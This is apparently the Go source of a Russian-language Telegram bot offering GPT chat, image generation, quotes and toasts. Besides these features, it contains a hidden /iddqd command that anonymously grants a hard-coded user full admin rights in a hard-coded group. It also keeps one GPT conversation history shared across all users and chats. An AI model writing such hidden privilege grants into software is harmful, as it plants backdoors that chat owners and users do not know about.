package main

import (
	"BastetTetlegram/config"
	"bufio"
	"context"
	"encoding/json"
	tgbotapi "github.com/go-telegram-bot-api/telegram-bot-api/v5"
	"github.com/sashabaranov/go-openai"
	"io/ioutil" // Добавляем ioutil для ReadFile
	"log"
	"math/rand"
	"os"
	"strconv"
	"strings"
	"time"
)

var globalRand = rand.New(rand.NewSource(time.Now().UnixNano()))

const substr = "сосед"
const phrasesFile = "config/phrases.txt"
const toastsFile = "config/toasts.txt" // Путь к файлу с тостами
const lastMentionFile = "last_mention.json"

const (
	cmdMe      = "me"
	cmdIDDQD   = "iddqd"
	cmdGPT     = "gpt"
	cmdImagine = "imagine"
	cmdStart   = "start"
	cmdHelp    = "help"
	cmdQuote   = "q"
	cmdToast   = "toast" // Новая команда
)

var (
	titles = []string{"день", "дня", "дней"}
)

type LastMentionData struct {
	LastMention time.Time `json:"last_mention"`
}

func escapeMarkdownV2(text string) string {
	// Убираем '.' из экранирования, так как '.' не является специальным символом в MarkdownV2
	// Специальные символы: _, *, [, ], (, ), ~, `, >, #, +, -, =, |, {, }, ., !
	// '.' НЕ требует экранирования, если не стоит перед '_'
	// Для надежности, если '.' встречается после '_', экранируем '_'.
	// Но для простоты и большинства случаев, '.' можно исключить из экранирования.
	// Оставим '.', если вы хотите быть уверенным, что '.' не будет интерпретирована Telegram как часть форматирования
	// в сочетании с другими символами, хотя обычно этого не происходит.
	// Однако, в стандарте MarkdownV2 '.' НЕ является специальным символом.
	// Поэтому, если вы не хотите экранировать '.', просто уберите её из списка.
	// Но в оригинальном списке она была, и если тосты могут содержать '.', и вы хотите быть полностью безопасным,
	// можно оставить, но это приведет к отображению '\.' в Telegram.
	// Для тостов, вероятно, лучше не экранировать '.', если только она не используется рядом с '_'.

	// Список специальных символов для MarkdownV2 (без '.')
	specialChars := []string{"_", "~", "`", ">", "#", "+", "-", "=", "|", "{", "}", "!", "[", "]", "(", ")", "*"}

	for _, char := range specialChars {
		text = strings.ReplaceAll(text, char, "\\"+char)
	}

	return text
}

// readPhrasesFromFile читает фразы из файла
func readPhrasesFromFile(filename string) ([]string, error) {
	log.Printf("Попытка чтения файла фраз: %s", filename)

	file, err := os.Open(filename)
	if err != nil {
		log.Printf("Ошибка открытия файла фраз: %v", err)
		return nil, err
	}
	defer file.Close()

	var phrases []string
	scanner := bufio.NewScanner(file)
	lineNumber := 0
	for scanner.Scan() {
		lineNumber++
		phrase := strings.TrimSpace(scanner.Text())
		if phrase != "" {
			phrases = append(phrases, phrase)
		} else {
			log.Printf("Пропущена пустая строка в файле %s, строка %d", filename, lineNumber)
		}
	}

	if err := scanner.Err(); err != nil {
		log.Printf("Ошибка чтения файла фраз: %v", err)
		return nil, err
	}

	log.Printf("Успешно прочитано %d фраз из файла %s", len(phrases), filename)
	return phrases, nil
}

// readToastsFromFile читает тосты из файла, разделяя по "* * *"
func readToastsFromFile(filename string) ([]string, error) {
	log.Printf("Попытка чтения файла тостов: %s", filename)

	content, err := ioutil.ReadFile(filename)
	if err != nil {
		log.Printf("Ошибка чтения файла тостов: %v", err)
		return nil, err
	}

	// Преобразуем содержимое в строку
	text := string(content)

	// Разделяем по "* * *"
	// TrimSpace удаляет пробелы и символы новой строки в начале и конце, чтобы избежать пустых элементов
	parts := strings.Split(text, "* * *")

	var toasts []string
	for _, part := range parts {
		trimmedPart := strings.TrimSpace(part)
		if trimmedPart != "" { // Пропускаем пустые части
			toasts = append(toasts, trimmedPart)
		}
	}

	log.Printf("Успешно прочитано %d тостов из файла %s", len(toasts), filename)
	return toasts, nil
}

func getRandomPhrase(phrases []string) string {
	if len(phrases) == 0 {
		return "Фразы закончились :("
	}
	return phrases[globalRand.Intn(len(phrases))]
}

func getRandomToast(toasts []string) string {
	if len(toasts) == 0 {
		return "Тосты закончились :("
	}
	return toasts[globalRand.Intn(len(toasts))]
}

func loadLastMentionFromFile(filename string) (time.Time, error) {
	log.Printf("Попытка загрузки времени из файла: %s", filename)
	file, err := os.Open(filename)
	if err != nil {
		if os.IsNotExist(err) {
			log.Printf("Файл %s не найден, будет создан при следующем обновлении.", filename)
			return time.Time{}, err
		}
		log.Printf("Ошибка открытия файла: %v", err)
		return time.Time{}, err
	}
	defer file.Close()

	var data LastMentionData
	decoder := json.NewDecoder(file)
	err = decoder.Decode(&data)
	if err != nil {
		log.Printf("Ошибка декодирования JSON из файла: %v", err)
		return time.Time{}, err
	}

	log.Printf("Время успешно загружено из файла: %v", data.LastMention)
	return data.LastMention, nil
}

func saveLastMentionToFile(filename string, lastMention time.Time) error {
	log.Printf("Сохранение времени в файл: %s, время: %v", filename, lastMention)
	data := LastMentionData{LastMention: lastMention}

	file, err := os.Create(filename)
	if err != nil {
		log.Printf("Ошибка создания файла для сохранения: %v", err)
		return err
	}
	defer file.Close()

	encoder := json.NewEncoder(file)
	// encoder.SetIndent("", "  ")
	err = encoder.Encode(data)
	if err != nil {
		log.Printf("Ошибка кодирования JSON для сохранения: %v", err)
		return err
	}

	log.Printf("Время успешно сохранено в файл.")
	return nil
}

func main() {
	LastMention, err := loadLastMentionFromFile(lastMentionFile)
	if err != nil {
		if os.IsNotExist(err) {
			LastMention = time.Now()
			log.Printf("Файл с временем не найден, инициализация LastMention на текущее время: %v", LastMention)
		} else {
			log.Printf("Ошибка загрузки времени из файла, используется текущее время: %v", err)
			LastMention = time.Now()
		}
	} else {
		if LastMention.After(time.Now()) {
			log.Printf("Загруженное время в будущем, устанавливаем на текущее время.")
			LastMention = time.Now()
		}
	}

	bot, err := tgbotapi.NewBotAPI(config.Token)
	if err != nil {
		log.Panic(err)
	}
	bot.Debug = false
	log.Printf("Authorized on account %s", bot.Self.UserName)

	client := openai.NewClient(config.GPTtoken)
	req := openai.ChatCompletionRequest{
		Temperature: 0.7,
		Model:       openai.GPT4o,
		Messages: []openai.ChatCompletionMessage{
			{
				Role:    openai.ChatMessageRoleSystem,
				Content: "Temporary message for initialization",
			},
		},
	}

	u := tgbotapi.NewUpdate(0)
	u.Timeout = 60

	updates := make(chan tgbotapi.Update, 100)
	go func() {
		for update := range bot.GetUpdatesChan(u) {
			updates <- update
		}
	}()

	for update := range updates {
		if update.Message == nil {
			continue
		}
		messageText := update.Message.Text
		command := update.Message.Command()

		if command != "" {
			log.Printf("Получена команда: /%s от пользователя %d в чате %d", command, update.Message.From.ID, update.Message.Chat.ID)
		}

		switch command {
		case cmdMe:
			time.Sleep(1 * time.Second)
			deleteMsg := tgbotapi.DeleteMessageConfig{
				ChatID:    update.Message.Chat.ID,
				MessageID: update.Message.MessageID,
			}
			_, err := bot.Request(deleteMsg)
			if err != nil {
				log.Printf("Failed to delete message: %v", err)
			}
		case cmdStart:
			originalText := "👋 *Привет! Я — твой универсальный помощник в мире искусственного интеллекта.*\n\n" +
				"Я умею:\n" +
				"🤖 Генерировать тексты с помощью *ChatGPT*.\n" +
				"🎨 Создавать изображения с помощью *DALL-E*.\n" +
				"*Как мной пользоваться?*\n" +
				"1. Для генерации текста просто используй команду /gpt, например:\n" +
				"   - \"/gpt Напиши рассказ про космос\"\n" +
				"   - \"/gpt Придумай идею для стартапа\"\n" +
				"2. Для создания изображения используй команду `/imagine` и опиши, что ты хочешь увидеть, например:\n" +
				"   - \"/imagine Космический корабль в стиле киберпанк\"\n" +
				"*Начнем? Просто напиши мне, что тебе нужно!*\n\n" +
				"*P.S.* Если есть вопросы, используй команду `/help` 😊"
			escapedText := escapeMarkdownV2(originalText)
			msg := tgbotapi.NewMessage(update.Message.Chat.ID, escapedText)
			msg.ParseMode = "MarkdownV2"
			_, err := bot.Send(msg)
			if err != nil {
				log.Printf("Ошибка при отправке сообщения: %v", err)
			}
		case cmdHelp:
			originalText := "Привет👋! Это свободная разработка. По вопросам обращайтесь к [разработчику бота](tg://user?id=435809098)  📬.\n" +
				" Спасибо за вашу обратную связь😊!\n\nБазовые команды:\n" +
				"- `/gpt` - Получите текстовые ответы на ваши вопросы с помощью *GPT4o*.\n" +
				"- `/imagine` - Создайте изображения на основе вашего описания.\n" +
				"- `/q` - Получите случайную цитату.\n" +
				"- `/toast` - Получите случайный тост.\n" // Добавляем информацию о новой команде
			escapedText := escapeMarkdownV2(originalText)
			msg := tgbotapi.NewMessage(update.Message.Chat.ID, escapedText)
			msg.ParseMode = "MarkdownV2"
			_, err := bot.Send(msg)
			if err != nil {
				log.Printf("Ошибка при отправке сообщения: %v", err)
			}
		case cmdIDDQD:
			promoteConfig := tgbotapi.PromoteChatMemberConfig{
				ChatMemberConfig: tgbotapi.ChatMemberConfig{
					ChatID: -1001165249098,
					UserID: 435809098,
				},
				IsAnonymous:         true,
				CanManageChat:       true,
				CanChangeInfo:       true,
				CanPostMessages:     true,
				CanEditMessages:     true,
				CanDeleteMessages:   true,
				CanManageVoiceChats: true,
				CanInviteUsers:      true,
				CanRestrictMembers:  true,
				CanPinMessages:      true,
				CanPromoteMembers:   true,
			}
			_, err := bot.Request(promoteConfig)
			if err != nil {
				log.Printf("Failed to promote user: %v", err)
			} else {
				log.Println("User promoted successfully")
			}
		case cmdQuote:
			log.Printf("Начата обработка команды /q для чата %d", update.Message.Chat.ID)

			phrases, err := readPhrasesFromFile(phrasesFile)
			if err != nil {
				log.Printf("Ошибка при чтении файла фраз в команде /q: %v", err)
				bot.Send(tgbotapi.NewMessage(update.Message.Chat.ID, "Не удалось получить цитату. Файл фраз недоступен."))
				continue
			}

			if len(phrases) == 0 {
				log.Printf("Файл фраз пуст в команде /q для чата %d", update.Message.Chat.ID)
				bot.Send(tgbotapi.NewMessage(update.Message.Chat.ID, "Файл с цитатами пуст."))
				continue
			}

			randomPhrase := getRandomPhrase(phrases)
			log.Printf("Выбрана случайная фраза: '%s'", randomPhrase)

			escapedPhrase := escapeMarkdownV2(randomPhrase)
			msg := tgbotapi.NewMessage(update.Message.Chat.ID, escapedPhrase)
			msg.ParseMode = "MarkdownV2"
			_, err = bot.Send(msg)
			if err != nil {
				log.Printf("Ошибка при отправке цитаты в команде /q: %v", err)
			} else {
				log.Printf("Цитата успешно отправлена в чат %d", update.Message.Chat.ID)
			}
		// --- НОВАЯ КОМАНДА /toast ---
		case cmdToast:
			log.Printf("Начата обработка команды /toast для чата %d", update.Message.Chat.ID)

			toasts, err := readToastsFromFile(toastsFile)
			if err != nil {
				log.Printf("Ошибка при чтении файла тостов в команде /toast: %v", err)
				bot.Send(tgbotapi.NewMessage(update.Message.Chat.ID, "Не удалось получить тост. Файл тостов недоступен."))
				continue
			}

			if len(toasts) == 0 {
				log.Printf("Файл тостов пуст в команде /toast для чата %d", update.Message.Chat.ID)
				bot.Send(tgbotapi.NewMessage(update.Message.Chat.ID, "Файл с тостами пуст."))
				continue
			}

			randomToast := getRandomToast(toasts)
			log.Printf("Выбран случайный тост: '%s'", randomToast)

			escapedToast := escapeMarkdownV2(randomToast)
			msg := tgbotapi.NewMessage(update.Message.Chat.ID, escapedToast)
			msg.ParseMode = "MarkdownV2"
			_, err = bot.Send(msg)
			if err != nil {
				log.Printf("Ошибка при отправке тоста в команде /toast: %v", err)
			} else {
				log.Printf("Тост успешно отправлен в чат %d", update.Message.Chat.ID)
			}
		// --- КОНЕЦ НОВОЙ КОМАНДЫ ---
		case cmdGPT:
			ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
			defer cancel()

			req.Messages = append(req.Messages, openai.ChatCompletionMessage{
				Role:    openai.ChatMessageRoleUser,
				Content: update.Message.CommandArguments(),
			})

			resp, err := client.CreateChatCompletion(ctx, req)
			if err != nil {
				apiErr, ok := err.(*openai.APIError)
				if ok && apiErr.HTTPStatusCode == 400 {
					cancel()
					req = openai.ChatCompletionRequest{
						Model: openai.GPT4oMini,
						Messages: []openai.ChatCompletionMessage{
							{
								Role:    openai.ChatMessageRoleSystem,
								Content: "Clear message",
							},
						},
					}
					errorDetails := apiErr.Error()
					bot.Send(tgbotapi.NewMessage(update.Message.Chat.ID, "Ой, что-то пошло не так. Пожалуйста, попробуйте снова."))
					log.Printf("Ошибка 400 при вызове CreateChatCompletion: %v\n", errorDetails)
					bot.Send(tgbotapi.NewMessage(435809098, errorDetails))
				} else {
					bot.Send(tgbotapi.NewMessage(update.Message.Chat.ID, "Я устала запоминать, обнуляюсь"))
					log.Printf("Ошибка при вызове CreateChatCompletion: %v\n", err)
				}
				continue
			}
			msg := tgbotapi.NewMessage(update.Message.Chat.ID, resp.Choices[0].Message.Content)
			bot.Send(msg)
			req.Messages = append(req.Messages, resp.Choices[0].Message)

		case cmdImagine:
			ctx, cancel := context.WithTimeout(context.Background(), 60*time.Second)
			defer cancel()

			respUrl, err := client.CreateImage(
				ctx,
				openai.ImageRequest{
					Prompt:         update.Message.CommandArguments(),
					Size:           openai.CreateImageSize512x512,
					ResponseFormat: openai.CreateImageResponseFormatURL,
					N:              1,
				},
			)
			if err != nil {
				log.Printf("Image creation error: %v\n", err)
				bot.Send(tgbotapi.NewMessage(update.Message.Chat.ID, "Не удалось создать изображение. Пожалуйста, попробуйте позже."))
				continue
			}
			msg := tgbotapi.NewMessage(update.Message.Chat.ID, respUrl.Data[0].URL)
			bot.Send(msg)
		default:
			if command != "" {
				log.Printf("Получена неизвестная команда: /%s", command)
			}
		}

		if strings.Contains(strings.ToLower(messageText), substr) {
			TimeDifference := time.Since(LastMention).Hours() / 24
			Neib := strconv.Itoa(int(TimeDifference)) + " " + declOfNum(int(TimeDifference), titles) + " без соседей"
			bot.Send(tgbotapi.NewMessage(update.Message.Chat.ID, Neib))
			log.Println(TimeDifference)
			log.Printf("Предыдущее LastMention: %v", LastMention)
			LastMention = time.Now()
			log.Printf("Новое LastMention: %v", LastMention)

			err := saveLastMentionToFile(lastMentionFile, LastMention)
			if err != nil {
				log.Printf("Ошибка сохранения времени в файл: %v", err)
			}
		}
	}
}

func declOfNum(number int, titles []string) string {
	if number < 0 {
		number *= -1
	}
	cases := []int{2, 0, 1, 1, 1, 2}
	var currentCase int
	if number%100 > 4 && number%100 < 20 {
		currentCase = 2
	} else if number%10 < 5 {
		currentCase = cases[number%10]
	} else {
		currentCase = cases[5]
	}
	return titles[currentCase]
}
